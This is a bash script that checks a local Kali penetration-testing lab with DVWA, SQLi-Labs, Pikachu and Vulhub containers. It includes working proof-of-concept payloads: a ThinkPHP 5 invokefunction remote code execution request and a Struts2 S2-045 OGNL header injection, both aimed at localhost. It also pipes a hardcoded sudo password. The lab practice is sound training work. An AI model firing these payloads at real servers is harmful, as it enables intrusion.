#!/bin/bash
# =============== 最终完整验证快照 · 所有靶场全查 ===============
export KALI_PASS="kail"
echo "$KALI_PASS" | sudo -S -v -p "" 2>/dev/null
SUDO="sudo"
SEP="============================================================"

echo ""
echo "$SEP"
echo "  [0] 本机 Kali IP、资源占用"
echo "$SEP"
ip -br addr show | grep -E "^(eth|ens|enp)" | head -3
echo "hostname: $(hostname)    date: $(date)"
df -h / 2>/dev/null | tail -1
free -h | head -2

echo ""
echo "$SEP"
echo "  [1] 系统 LAMP 原生靶场（端口 80 + 3306） "
echo "$SEP"
echo " 1.1 DVWA（你已装好）:  http://127.0.0.1/"
C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 http://127.0.0.1/ 2>&1 || echo 000)
TITLE=$(curl -s --max-time 10 http://127.0.0.1/ 2>&1 | grep -oE "<title>[^<]+</title>" | head -1)
echo "    HTTP / : $C    $TITLE"

echo ""
echo " 1.2 SQLi-Labs 靶场（Day22-26） "
[ -d /var/www/html/sqli-labs ] && echo "    ✅ 源码目录存在：/var/www/html/sqli-labs  ($(find /var/www/html/sqli-labs -maxdepth 1 -type f 2>/dev/null | wc -l) 个文件)" || echo "    ❌ 源码目录不存在"
C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 http://127.0.0.1/sqli-labs/ 2>&1 || echo 000)
SL_CFG_OK=0
grep -q "auto_prepend_file.*mysql2mysqli" /etc/php/*/apache2/conf.d/*.ini 2>/dev/null && SL_CFG_OK=1
echo "    HTTP /sqli-labs/: $C    PHP mysql兼容层已启用: $( [ $SL_CFG_OK = 1 ] && echo ✅ || echo ❌ )"

echo ""
echo " 1.3 Pikachu 靶场（Day27-31） "
[ -d /var/www/html/pikachu ] && echo "    ✅ 源码目录存在：/var/www/html/pikachu ($(find /var/www/html/pikachu -maxdepth 1 -type f 2>/dev/null | wc -l) 个文件)" || echo "    ❌ 源码目录不存在"
C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 http://127.0.0.1/pikachu/ 2>&1 || echo 000)
PIKA_OK=0
grep -qE "DBHOST|DBPORT.*3306" /var/www/html/pikachu/inc/config.inc.php 2>/dev/null && PIKA_OK=1
echo "    HTTP /pikachu/: $C     config.inc.php 五大常量齐全: $( [ $PIKA_OK = 1 ] && echo ✅ || echo ❌ )"

echo ""
echo "$SEP"
echo "  [2] XAMPP Upload-Labs 靶场（端口 81/3307 PHP 5.6）"
echo "$SEP"
if [ -x /opt/lampp/bin/php ]; then
  echo "  ✅ XAMPP 已安装: PHP $(/opt/lampp/bin/php -r 'echo PHP_VERSION;')  路径 /opt/lampp"
  ss -tlnp 2>/dev/null | grep -E ":(81|3307)\\b" | sed 's/^/    /'
  [ -d /opt/lampp/htdocs/upload-labs ] && echo "  ✅ Upload-Labs 已部署到 /opt/lampp/htdocs/upload-labs" || echo "  ⚠️ Upload-Labs 未部署（下载 XAMPP 后脚本会放上去）"
else
  echo "  ⏸️ XAMPP 未安装（用户此前点了跳过；需要时重新跑 kali_p10_upload_xampp.sh 即可）"
  echo "     文档已完整交付：docs/labs/搭建Upload-Labs靶场过程及问题.md"
fi

echo ""
echo "$SEP"
echo "  [3] Docker 框架靶场（Vulhub · 4 个端口）"
echo "$SEP"
echo "  3.1 Docker 状态 & 所有镜像："
$SUDO docker images 2>&1 | grep -E "REPOSITORY|vulhub|cve-" | sed 's/^/    /'
echo ""
echo "  3.2 当前运行的容器："
$SUDO docker ps --format "table {{.Names}}\t{{.Image}}\t{{.Ports}}\t{{.Status}}" 2>&1 | sed 's/^/    /'
echo ""
echo "  3.3 4 个靶场端口 HTTP 健康检查 + POC 级验证："

# 8080 Tomcat Demo
C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 http://127.0.0.1:8080/ 2>&1 || echo 000)
SZ=$(curl -s --max-time 10 http://127.0.0.1:8080/ 2>/dev/null | wc -c)
echo "    :8080  Tomcat CVE-2017-12615 Demo  → HTTP $C  size=${SZ}B   $( [ "$C" = "200" ] && echo '✅ 正常' || echo '❌' )"

# 8081 ThinkPHP
C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 http://127.0.0.1:8081/ 2>&1 || echo 000)
RCE=$(curl -sS --max-time 15 "http://127.0.0.1:8081/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id" 2>&1 | grep -oE "uid=[0-9]+\(www-data\)" | head -1)
[ -z "$RCE" ] && RCE_SIZE=$(curl -sS --max-time 15 "http://127.0.0.1:8081/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1" 2>&1 | wc -c) || RCE_SIZE=0
echo "    :8081  ThinkPHP 5.0.20 RCE (Day37) → HTTP $C  cmd执行: $( [ -n "$RCE" ] && echo "✅ PWNED: $RCE" || { [ $RCE_SIZE -gt 100 ] && echo "✅ phpinfo返回${RCE_SIZE}字节(POC可行)" || echo "❌"; } )"

# 8082 S2-045
C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 http://127.0.0.1:8082/ 2>&1 || echo 000)
HEADER_PWND=$(curl -sS -D /tmp/.s2hdr -X POST --max-time 15 http://127.0.0.1:8082/ \
  -H 'Content-Type: %{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("X-PWND","S2-045_OK")}.multipart/form-data' \
  -o /tmp/.s2bd 2>/dev/null; grep -i "X-PWND" /tmp/.s2hdr 2>/dev/null | head -1 | tr -d '\r')
echo "    :8082  Struts2 S2-045 RCE (Day38) → HTTP $C  响应头注入: $( [ -n \"$HEADER_PWND\" ] && echo \"✅ $HEADER_PWND\" || echo \"❌\" )"

# 8083 WebLogic
C=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "http://127.0.0.1:8083/ws-wsat/CoordinatorPortType" 2>&1 || echo 000)
CONSOLE=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "http://127.0.0.1:8083/console/" 2>&1 || echo 000)
SZ=$(curl -s --max-time 10 "http://127.0.0.1:8083/ws-wsat/CoordinatorPortType" 2>/dev/null | wc -c)
WLS_IMG=$($SUDO docker images 2>&1 | grep -c "weblogic" || echo 0)
WLS_STATUS="❌ 镜像未拉取/未启动；用 Vulfocus.cn 兜底 10 秒启动（见文档路线B）"
if [ "$WLS_IMG" -gt 0 ]; then WLS_STATUS="⏳ 镜像已拉取($WLS_IMG个)，后台在 up 中"; fi
if [ $SZ -gt 200 ] || [ "$CONSOLE" = "200" ] || [ "$CONSOLE" = "302" ]; then WLS_STATUS="✅ WebLogic 控制台/Wsat端点 加载完成"; fi
echo "    :8083  WebLogic CVE-2017-10271 (Day43) → /ws-wsat HTTP $C (${SZ}B)  /console HTTP $CONSOLE  状态：$WLS_STATUS"

echo ""
echo "$SEP"
echo "  [4] 所有交付文档（docs/labs/ 目录）"
echo "$SEP"
find "$(cd "$(dirname "$0")/.." ; pwd)/docs/labs" -maxdepth 1 -name "*.md" -type f 2>/dev/null | sort | sed 's/^/    /'
echo ""
echo "$SEP"
echo "  [5] 交付脚本（scripts/ 目录 kail_ 开头的靶场脚本）"
echo "$SEP"
find "$(cd "$(dirname "$0")/.." ; pwd)/scripts" -maxdepth 1 -name "kali_p1*.sh" -o -name "kali_p10*.sh" -o -name "kali_p11*.sh" -o -name "kali_p12*.sh" -o -name "kali_snap*.sh" 2>/dev/null | sort | sed 's/^/    /'
echo ""
echo "$SEP"
echo " 最终宿主机访问一览（复制保存到浏览器收藏夹）："
echo "$SEP"
echo "  🎯 DVWA           → http://192.168.108.128/              （ admin / password ）"
echo "  🎯 SQLi-Labs      → http://192.168.108.128/sqli-labs/    （先点 Page-2 Setup 初始化）"
echo "  🎯 Pikachu        → http://192.168.108.128/pikachu/      （先点顶部安装初始化）"
echo "  🎯 Upload-Labs    → http://192.168.108.128:81/upload-labs/  （XAMPP装好就通）"
echo "  🎯 Tomcat Demo    → http://192.168.108.128:8080/         （PUT上传 JSP 利用演示）"
echo "  🎯 ThinkPHP 5 RCE → http://192.168.108.128:8081/         （Day37）"
echo "  🎯 Struts2 S2-045 → http://192.168.108.128:8082/         （Day38）"
echo "  🎯 WebLogic WSAT  → http://192.168.108.128:8083/ws-wsat/CoordinatorPortType  （Day43，拉取中/Vulfocus兜底）"
echo ""
echo "DONE · 最终验证快照结束。"
